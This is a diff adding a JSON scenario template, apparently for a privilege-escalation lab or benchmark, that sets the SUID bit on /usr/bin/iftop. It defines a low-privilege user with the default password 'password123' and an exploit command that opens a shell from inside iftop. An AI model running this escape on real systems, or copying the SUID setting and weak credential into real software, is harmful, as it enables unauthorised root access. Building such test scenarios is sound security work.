@@ -1,0 +1,31 @@
+{
+  "template_id": "auto_T1548_001_suid_iftop",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "SUID bit set on /usr/bin/iftop allows privilege escalation via shell",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "interactive_escape",
+  "dedup_group": "suid_shell_escape",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "T1548_001_suid_iftop",
+      "type": "core",
+      "difficulty": "easy"
+    }
+  ],
+  "exploit_cmd": "iftop\n!/bin/sh",
+  "binary_path": "/usr/bin/iftop"
+}
